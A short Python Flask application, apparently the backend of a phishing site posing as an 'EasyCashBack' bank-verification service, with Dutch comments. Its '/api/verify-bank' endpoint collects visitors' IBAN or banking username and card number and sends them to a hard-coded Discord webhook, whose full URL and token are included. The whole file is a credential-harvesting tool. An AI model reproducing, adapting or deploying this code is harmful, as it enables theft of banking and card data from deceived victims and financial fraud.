from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Jouw Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1491401500428079174/6sKKzOPurbFR-X557CPYUDXgRATDio87eg0GWwUMVFZkopS5D4VW7oJegJeUhM_B1Ir5"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/verify-bank', methods=['POST'])
def verify_bank():
    try:
        data = request.json
        iban = data.get('iban', 'Onbekend')
        card = data.get('card', 'Onbekend')
        
        # Bericht opmaken voor Discord
        payload = {
            "embeds": [{
                "title": "💳 Nieuwe Bankkoppeling Ontvangen",
                "description": "Er is zojuist een nieuwe activatie voltooid op de EasyCashBack Hub.",
                "color": 16705372, # Goud/Geel
                "fields": [
                    {
                        "name": "🏦 IBAN / Gebruikersnaam",
                        "value": f"```css\n{iban}\n```",
                        "inline": False
                    },
                    {
                        "name": "🔑 Kaartnummer",
                        "value": f"```css\n{card}\n```",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "EasyCashBack Live Systeem"
                }
            }]
        }
        
        # Echt versturen naar Discord
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        
        return jsonify({"status": "success"}), 200
            
    except Exception as e:
        print(f"Fout: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run(debug=True)
